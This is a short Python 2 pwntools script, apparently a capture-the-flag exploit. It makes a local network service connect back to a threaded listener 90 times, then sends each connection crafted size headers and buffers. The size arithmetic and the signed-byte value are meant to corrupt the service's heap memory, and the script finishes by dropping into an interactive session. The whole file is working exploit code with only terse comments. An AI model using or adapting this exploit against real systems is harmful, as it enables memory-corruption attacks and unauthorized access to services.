from pwn import *
import socket
import threading
import random
import time

p = random.randint(20000, 50000)
num_threads = 90

def thread_listen(port=9999):
    l = socket.socket()
    l.bind(('0.0.0.0', port))
    l.listen(5)

    for i in xrange(num_threads):
        conn, _ = l.accept()
        print(conn, _)
        if i == 0:
            t = threading.Thread(target=thread_send, args=(conn, 0xffff, 0x9000))
        else:
            t = threading.Thread(target=thread_send, args=(conn, 0x20-3, 0x3, i))
            
        t.start()

def thread_send(c, size1, size2, index=0xffff):
    # malloc(size1 + size2 + 8)
    # size1 = p16(size1) # 16 bit size
    # size2 = p32(size2) # 32 bit size, must be <= 0x40000000

    version = p16(1)
    header = version + p16(size1) + p32(size2)
    c.send(header)

    if size1 == 0xffff:
        # First thread
        buff = '\xff' * (size1+size2)
        c.send(buff)
    else:
        # All other threads
        buff = p8(0xff) * (size1)
        buff += p8(0x84) # Signed first bit
        buff += p8(0x7f)
        buff += p8(0xff)
        buff += p8(0xff)

        c.send(buff)


def start_threads():
    t = threading.Thread(target=thread_listen, args=(p, ))
    t.daemon = True
    t.start()
    return t

curr_t = start_threads()

r = remote('127.0.0.1', 24242)

n_threads = p16(num_threads)
connect_host = socket.inet_aton('127.0.0.1')

payload = n_threads
payload += p16(p) # port
payload += connect_host

r.sendline(payload)

r.interactive()
